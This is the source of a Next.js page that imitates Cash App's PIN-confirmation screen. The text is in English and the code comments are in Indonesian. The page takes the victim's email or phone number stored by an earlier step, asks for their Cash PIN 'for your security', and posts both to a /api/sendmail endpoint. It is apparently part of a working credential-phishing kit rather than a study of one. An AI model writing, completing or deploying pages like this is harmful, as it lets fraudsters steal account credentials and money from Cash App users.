"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/router";

export default function PinPage() {
  const router = useRouter();
  const [pin, setPin] = useState("");
  const [loginData, setLoginData] = useState(null);
  const [isDisabled, setIsDisabled] = useState(false);

  useEffect(() => {
    // ambil data dari localStorage
    const saved = localStorage.getItem("loginData");
    if (saved) {
      setLoginData(JSON.parse(saved));
    } else {
      // kalau langsung akses /pin tanpa isi data → balik ke index
      router.push("/");
    }
  }, [router]);

  const handleChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6); // hanya angka max 6 digit
    setPin(value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!loginData) return;

    setIsDisabled(true);
    try {
      // gabungkan email/phone dengan pin
      const payload = { ...loginData, pin };

      const res = await fetch("/api/sendmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      if (data.success) {
        alert("Data berhasil dikirim!");
        localStorage.removeItem("loginData"); // bersihkan setelah dipakai
        router.push("/"); // redirect ke halaman awal
      } else {
        alert("Gagal kirim data!");
      }
    } catch (err) {
      console.error("Error kirim:", err);
      alert("Terjadi error saat kirim data");
    } finally {
      setIsDisabled(false);
    }
  };

  return (
    <div className="page">
      <header className="topbar">
        <a className="brand" href="#" aria-label="Cash App">
          <span className="brandIcon" aria-hidden>
            {/* Logo */}
          </span>
        </a>
      </header>

      <div className="center">
        <div className="panel">
          <h1 className="title">Enter your Cash PIN</h1>
          <p className="subtitle">For your security, please confirm your PIN</p>

          <form onSubmit={handleSubmit} className="form">
            <input
              type="password"
              value={pin}
              onChange={handleChange}
              maxLength={6}
              className="input single"
              placeholder="••••"
            />

            <div className="actions">
              <button
                type="submit"
                className="btn primary"
                disabled={pin.length < 4 || isDisabled}
              >
                Continue
              </button>
              <button
                type="button"
                className="btn ghost"
                onClick={() => router.push("/")}
              >
                Cancel
              </button>
            </div>
          </form>
        </div>
      </div>
                        <style jsx>{`
        :root{ --text:#0b0b0b; --muted:#6b6b6b; --green:#00C244; --border:#d7d7d7; --bg:#fff; }
        *{box-sizing:border-box}
        html,body,#__next,.page{height:100%}
        body{margin:0;font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial}

        .page{background:var(--bg); color:var(--text)}

        .topbar{height:64px; display:flex; align-items:center}
        .brand{display:inline-flex; align-items:center; gap:10px; text-decoration:none; color:inherit; padding:12px 18px}

        .center{display:grid; place-items:start center; padding:48px 16px}
        .panel{width:100%; max-width:480px}

        .title{font-size:40px; line-height:1.1; margin:24px 0 8px}
        .subtitle{margin:0 0 24px; color:var(--muted)}
        .link{color:rgb(0, 214, 79); text-decoration:none; font-weight:600}

        .form{margin-top:8px}
        .label{font-size:14px; color:#444; font-weight:600; margin-bottom:8px; display:block}

        .input{flex:1; height:56px; border:2px solid var(--green); padding:0 14px; font-size:16px; outline:none}
        .input.single{border-radius:12px; width:100%}
        .input::placeholder{color:#a9a9a9}
        .input:focus{box-shadow:0 0 0 4px rgb(0, 214, 79)}

        .actions{display:flex; gap:16px; margin:24px 0}
        .btn{flex:1; height:48px; border-radius:999px; border:1px solid var(--border); font-weight:700; cursor:pointer}
        .btn.ghost{background:#f0f0f0}
        .btn.ghost:hover{background:#e9e9e9}
        .btn.primary{background:rgb(0, 214, 79); color:#fff; border-color:transparent}
        .btn.primary:disabled{
          background:#c5c5c5;
          cursor:not-allowed;
          opacity:0.7;
        }

        .helper{color:#4b4b4b; font-size:12.5px}
        .helper a{color:#111}

        .disclosures{margin-top:40px; color:#6a6a6a; font-size:13px; line-height:1.6}
        .disclosures p{margin:0 0 14px}

        @media(max-width:520px){.title{font-size:32px} .center{padding:24px 16px}}
      `}</style>
    </div>
  );
}
